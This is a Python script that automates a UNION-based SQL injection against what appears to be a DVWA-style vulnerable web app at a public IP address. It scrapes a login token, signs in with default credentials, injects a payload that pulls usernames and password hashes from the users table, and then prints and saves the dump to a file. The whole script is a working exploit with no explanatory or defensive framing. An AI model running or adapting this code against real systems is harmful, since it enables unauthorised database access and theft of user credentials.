
import subprocess
import re
from html import unescape

# Step 1: Get login page and extract token
cmd = [
    'curl',
    '-s',
    '-c', '/tmp/cookies.txt',
    'http://31.97.117.123/login.php'
]

result = subprocess.run(cmd, capture_output=True, text=True)
token_match = re.search(r"user_token['\"]?\s*value['\"]?\s*=\s*['\"]([a-f0-9]+)['\"]", result.stdout)
token = token_match.group(1) if token_match else None
print(f"[*] Token: {token}")

# Step 2: Login
cmd = [
    'curl',
    '-s',
    '-b', '/tmp/cookies.txt',
    '-c', '/tmp/cookies.txt',
    '-d', f'username=admin&password=password&user_token={token}&Login=Login',
    'http://31.97.117.123/login.php'
]

result = subprocess.run(cmd, capture_output=True, text=True)
print("[*] Logged in successfully\n")

# Step 3: Extract all users with complete information
print("[*] Extracting complete user information...\n")

users_list = []

# Get complete user info for each user
for user_id in range(1, 20):
    # Query to get first_name and last_name for the user
    test_id = f"{user_id}"
    
    cmd = [
        'curl',
        '-s',
        '-b', '/tmp/cookies.txt',
        '-d', f'id={test_id}&Submit=Submit',
        'http://31.97.117.123/vulnerabilities/sqli/'
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
    
    # Extract user details
    if '<pre>' in result.stdout:
        start = result.stdout.find('<pre>')
        end = result.stdout.find('</pre>', start) + 6
        section = result.stdout[start:end]
        content = section.replace('<pre>', '').replace('</pre>', '').strip()
        
        # Look for: ID: X<br />First name: Y<br />Surname: Z
        id_match = re.search(r'ID: (.*?)<br />', content)
        first_match = re.search(r'First name: (.*?)<br />', content)
        last_match = re.search(r'Surname: (.*?)(?:<br|$)', content)
        
        if id_match and first_match and last_match:
            user_id_val = id_match.group(1).strip()
            first_name = first_match.group(1).strip()
            last_name = last_match.group(1).strip()
            
            # Try to extract from the database to get the username and hash
            test_id_2 = f"999' UNION SELECT user, password FROM users WHERE user_id={user_id}-- -"
            
            cmd = [
                'curl',
                '-s',
                '-b', '/tmp/cookies.txt',
                '-d', f'id={test_id_2}&Submit=Submit',
                'http://31.97.117.123/vulnerabilities/sqli/'
            ]
            
            result2 = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            if '<pre>' in result2.stdout:
                start = result2.stdout.find('<pre>')
                end = result2.stdout.find('</pre>', start) + 6
                section = result2.stdout[start:end]
                content = section.replace('<pre>', '').replace('</pre>', '').strip()
                
                user_match = re.search(r'First name: (.*?)<br />', content)
                pass_match = re.search(r'Surname: (.*?)(?:<br|$)', content)
                
                if user_match and pass_match:
                    username = user_match.group(1).strip()
                    password_hash = pass_match.group(1).strip()
                    
                    if username and password_hash:
                        users_list.append({
                            'user_id': user_id,
                            'first_name': first_name,
                            'last_name': last_name,
                            'username': username,
                            'password_hash': password_hash
                        })
                        print(f"[+] User {user_id}: {first_name} {last_name} ({username}) - {password_hash}")

print("\n" + "="*100)
print("[+] COMPLETE USER DATABASE DUMP:")
print("="*100)

if users_list:
    print(f"\n{'ID':<5} {'First Name':<15} {'Last Name':<15} {'Username':<15} {'Password Hash':<35}")
    print("-" * 100)
    for user in users_list:
        print(f"{user['user_id']:<5} {user['first_name']:<15} {user['last_name']:<15} {user['username']:<15} {user['password_hash']:<35}")
    
    print("\n[+] JSON Format:")
    import json
    print(json.dumps(users_list, indent=2))
    
    # Also save to file
    with open('/tmp/users_extracted.json', 'w') as f:
        json.dump(users_list, f, indent=2)
    print("\n[*] Data saved to /tmp/users_extracted.json")

